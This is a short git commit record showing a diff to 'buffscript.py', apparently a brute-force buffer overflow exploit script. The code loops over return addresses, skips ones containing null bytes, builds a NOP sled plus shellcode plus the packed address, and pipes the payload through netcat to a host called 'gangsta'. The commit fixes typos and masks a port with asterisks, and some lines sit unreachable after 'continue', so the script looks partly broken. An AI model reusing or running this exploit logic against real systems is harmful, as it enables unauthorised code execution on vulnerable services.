f8c8616180af21a9267e09f44a1fcb8183700f67
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-03-29 17:18:47 -0400

    Update buffscript.py

--- buffscript.py
+++ buffscript.py
@@ -8,10 +8,10 @@ for i in range (3000):
   mem_ad = hex(memory)
   hex_int = int(mem_ad, 16)
   pack = struct.pack('<L', hex_int)
-  if "\x00" iin pack:
+  if "\x00" in pack:
     memory += 1
     continue
     pad = "\x90" * 445
-    command_prompt = "echo " + '"' + "000" + pad + shellcode + pack + '"'
-    os.system(command_prompt + " | " + nc gangsta 0000")
+    command_prompt = "echo " + '"' + "***" + pad + shellcode + pack + '"'
+    os.system(command_prompt + " | " + "nc gangsta ****")
     memory += 1
